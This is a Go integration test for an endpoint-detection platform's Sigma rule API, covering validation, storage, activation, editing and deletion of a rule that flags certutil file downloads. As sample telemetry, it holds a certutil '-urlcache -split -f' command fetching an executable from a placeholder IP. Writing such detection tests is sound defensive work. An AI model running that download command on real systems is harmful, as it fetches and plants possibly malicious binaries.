package handlers

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/edr-platform/sigma-engine/internal/application/detection"
	"github.com/edr-platform/sigma-engine/internal/application/mapping"
	"github.com/edr-platform/sigma-engine/internal/application/rules"
	"github.com/edr-platform/sigma-engine/internal/application/rulesync"
	"github.com/edr-platform/sigma-engine/internal/domain"
	"github.com/edr-platform/sigma-engine/internal/infrastructure/cache"
	"github.com/edr-platform/sigma-engine/internal/infrastructure/database"
	"github.com/google/uuid"
	"github.com/gorilla/mux"
	"github.com/jackc/pgx/v5"
	"github.com/jackc/pgx/v5/pgxpool"
)

const authoredRule = `title: MITRAS test - Certutil URL cache download
status: test
description: certutil used to download a file from a URL
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains|all:
      - '-urlcache'
      - 'http'
  condition: selection
level: high
tags:
  - attack.command_and_control
  - attack.t1105
`

func authoringDB(t *testing.T) *pgxpool.Pool {
	t.Helper()
	if os.Getenv("EDR_TEST_DB_ISOLATED") != "1" || os.Getenv("EDR_TEST_DB_URL") == "" {
		t.Skip("requires explicitly disposable loopback DB")
	}
	ctx := context.Background()
	cfg, err := pgxpool.ParseConfig(os.Getenv("EDR_TEST_DB_URL"))
	if err != nil || (cfg.ConnConfig.Host != "127.0.0.1" && cfg.ConnConfig.Host != "localhost") {
		t.Fatal("loopback test DB required")
	}
	admin, err := pgxpool.NewWithConfig(ctx, cfg)
	if err != nil {
		t.Fatal(err)
	}
	name := "edr_authoring_" + strings.ReplaceAll(uuid.NewString(), "-", "")
	quoted := pgx.Identifier{name}.Sanitize()
	if _, err := admin.Exec(ctx, "CREATE DATABASE "+quoted); err != nil {
		t.Fatal(err)
	}
	cfg = cfg.Copy()
	cfg.ConnConfig.Database = name
	pool, err := pgxpool.NewWithConfig(ctx, cfg)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		pool.Close()
		c, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		_, _ = admin.Exec(c, "DROP DATABASE "+quoted+" WITH (FORCE)")
		admin.Close()
	})
	if err := database.RunMigrations(ctx, pool); err != nil {
		t.Fatal(err)
	}
	return pool
}

type apiCall func(method, path string, body interface{}) (int, map[string]interface{})

// authoringRouter wires the production rule API to a real repository,
// rulesync runtime and detection engine.
func authoringRouter(t *testing.T, pool *pgxpool.Pool) (apiCall, *detection.SigmaDetectionEngine) {
	t.Helper()
	repo := database.NewPostgresRuleRepository(pool)
	fc, _ := cache.NewFieldResolutionCache(1024)
	rc, _ := cache.NewRegexCache(1024)
	quality := &rules.QualityFilter{MinLevel: "medium", AllowedStatus: []string{"stable", "test"}, SkipExperimental: true}
	engine := detection.NewSigmaDetectionEngine(mapping.NewFieldMapper(fc), detection.NewModifierRegistry(rc), fc,
		detection.QualityConfig{MinConfidence: 0.6, EnableFilters: true, EnableContextValidation: true, RuleQuality: detection.RuleQualityConfig{MinLevel: "medium", AllowedStatus: []string{"stable", "test"}, SkipExperimental: true}})
	runtime := rulesync.New(repo, engine, quality, []string{"windows"})
	if err := runtime.Refresh(context.Background()); err != nil {
		t.Fatal(err)
	}
	h := NewRuleHandler(repo, nil)
	h.runtime = runtime
	router := mux.NewRouter()
	h.RegisterRoutes(router.PathPrefix("/api/v1").Subrouter())
	call := func(method, path string, body interface{}) (int, map[string]interface{}) {
		var buf bytes.Buffer
		if body != nil {
			_ = json.NewEncoder(&buf).Encode(body)
		}
		rec := httptest.NewRecorder()
		router.ServeHTTP(rec, httptest.NewRequest(method, path, &buf))
		out := map[string]interface{}{}
		_ = json.Unmarshal(rec.Body.Bytes(), &out)
		return rec.Code, out
	}
	return call, engine
}

// End to end: dashboard API → validation → PostgreSQL → runtime activation →
// the running detector alerts on matching telemetry.
func TestRuleAuthoringEndToEnd(t *testing.T) {
	call, engine := authoringRouter(t, authoringDB(t))
	processEvent := func(cmd string) *domain.LogEvent {
		ev, err := domain.NewLogEvent(map[string]interface{}{
			"event_id": uuid.NewString(), "event_type": "process", "timestamp": time.Now().UTC().Format(time.RFC3339),
			"data": map[string]interface{}{"executable": `C:\Windows\System32\certutil.exe`, "command_line": cmd,
				"parent_executable": `C:\Windows\System32\cmd.exe`, "user_name": `WS\alice`, "pid": 4242},
		})
		if err != nil {
			t.Fatal(err)
		}
		return ev
	}
	fires := func(ruleID, cmd string) bool {
		res := engine.DetectAggregated(processEvent(cmd))
		for _, m := range res.Matches {
			if m.Rule.ID == ruleID {
				return true
			}
		}
		return false
	}
	malicious := `certutil.exe -urlcache -split -f http://198.51.100.9/a.exe a.exe`

	// 1. Validate: metadata derived from YAML, will activate, sample event matches.
	code, v := call("POST", "/api/v1/sigma/rules/validate", map[string]interface{}{"content": authoredRule,
		"event": map[string]interface{}{"event_type": "process", "data": map[string]interface{}{"executable": `C:\Windows\System32\certutil.exe`, "command_line": malicious}}})
	if code != 200 || v["valid"] != true || v["will_activate"] != true || v["matched"] != true || v["severity"] != "high" || v["category"] != "process_creation" {
		t.Fatalf("validate: %d %v", code, v)
	}
	generatedID, _ := v["id"].(string)
	if generatedID == "" {
		t.Fatal("no id generated for YAML without id")
	}

	// 2. Create: stored, activated, the running detector now alerts.
	code, created := call("POST", "/api/v1/sigma/rules", map[string]interface{}{"content": authoredRule, "severity": "low", "title": "client-supplied title is ignored"})
	if code != http.StatusCreated {
		t.Fatalf("create: %d %v", code, created)
	}
	id := created["id"].(string)
	if created["severity"] != "high" || created["title"] != "MITRAS test - Certutil URL cache download" || created["source"] != "custom" {
		t.Fatalf("metadata not taken from YAML: %v", created)
	}
	if !fires(id, malicious) {
		t.Fatal("created rule is not active in the running detector")
	}
	if fires(id, `certutil.exe -hashfile C:\x.bin SHA256`) {
		t.Fatal("benign certutil use matched")
	}
	// Detail view returns the YAML (with the generated id written into it).
	code, detail := call("GET", "/api/v1/sigma/rules/"+id, nil)
	if code != 200 || !strings.Contains(detail["content"].(string), "id: "+id) {
		t.Fatalf("detail content: %d %v", code, detail["content"])
	}
	// Duplicate id is rejected.
	if code, _ := call("POST", "/api/v1/sigma/rules", map[string]interface{}{"content": detail["content"]}); code != http.StatusConflict {
		t.Fatalf("duplicate id: %d", code)
	}

	// 3. A valid rule the detector would never load is refused with the reason.
	lowRule := strings.Replace(authoredRule, "level: high", "level: low", 1)
	code, v = call("POST", "/api/v1/sigma/rules/validate", map[string]interface{}{"content": lowRule})
	if v["valid"] != true || v["will_activate"] != false || !strings.Contains(v["inactive_reason"].(string), "quality filter") {
		t.Fatalf("low-level eligibility: %d %v", code, v)
	}
	if code, body := call("POST", "/api/v1/sigma/rules", map[string]interface{}{"content": lowRule}); code != http.StatusUnprocessableEntity {
		t.Fatalf("inactive rule stored: %d %v", code, body)
	}
	// Broken YAML / invalid detection is reported, never stored.
	if _, v := call("POST", "/api/v1/sigma/rules/validate", map[string]interface{}{"content": "title: x\ndetection:\n  condition: missing_selection\n"}); v["valid"] != false || v["error"] == "" {
		t.Fatalf("invalid rule accepted: %v", v)
	}

	// 4. Edit: the detector follows the new logic.
	edited := strings.Replace(detail["content"].(string), "'-urlcache'", "'-verifyctl'", 1)
	if code, body := call("PUT", "/api/v1/sigma/rules/"+id, map[string]interface{}{"content": edited}); code != 200 {
		t.Fatalf("update: %d %v", code, body)
	}
	if fires(id, malicious) || !fires(id, `certutil.exe -verifyctl -f http://198.51.100.9/x`) {
		t.Fatal("edited logic not active")
	}

	// 5. Disable / delete remove it from the detector.
	if code, _ := call("PATCH", "/api/v1/sigma/rules/"+id+"/disable", nil); code != 200 {
		t.Fatalf("disable: %d", code)
	}
	if fires(id, `certutil.exe -verifyctl -f http://198.51.100.9/x`) {
		t.Fatal("disabled rule still active")
	}
	if code, _ := call("DELETE", "/api/v1/sigma/rules/"+id, nil); code != http.StatusNoContent {
		t.Fatalf("delete: %d", code)
	}
	if code, _ := call("GET", "/api/v1/sigma/rules/"+id, nil); code != http.StatusNotFound {
		t.Fatalf("deleted rule still readable: %d", code)
	}
}
